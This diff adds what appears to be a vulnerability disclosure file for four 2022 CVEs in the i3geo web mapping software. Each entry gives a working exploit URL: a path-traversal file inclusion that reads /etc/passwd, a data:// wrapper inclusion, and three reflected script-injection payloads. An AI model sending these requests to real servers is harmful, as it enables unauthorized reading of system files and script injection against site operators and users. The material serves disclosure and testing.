@@ -1,1 +1,82 @@
+####################################
+#    LFI - Local File Inclusion    #
+####################################
 
+i3geo - Proof of Concept - Version 6 <= 7.0.5 (CVE-2022-32409)
+
+The vulnerability is a LFI (Local File Inclusion) in codemirror.php file. The file is located in the "exemplos" folder (/i3geo/exemplos/).
+
+To exploit vulnerability:
+- http://.../i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
+- http://.../i3geo/exemplos/codemirror.php?&pagina=data://text/plain;base64,SEFDS0VE
+
+To download i3geo:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5 (CVE-2022-34092)
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in svg2img.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit vulnerability:
+- http://.../i3geo/pacotes/svg2img.php?w=%3C/script%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+To download i3geo:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5 (CVE-2022-34093)
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in access_token.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit vulnerability:
+- http://.../i3geo/pacotes/linkedinoauth/example/access_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+To download i3geo:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5 (CVE-2022-34094)
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in request_token.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit vulnerability:
+- http://.../i3geo/pacotes/linkedinoauth/example/request_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+To download i3geo:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
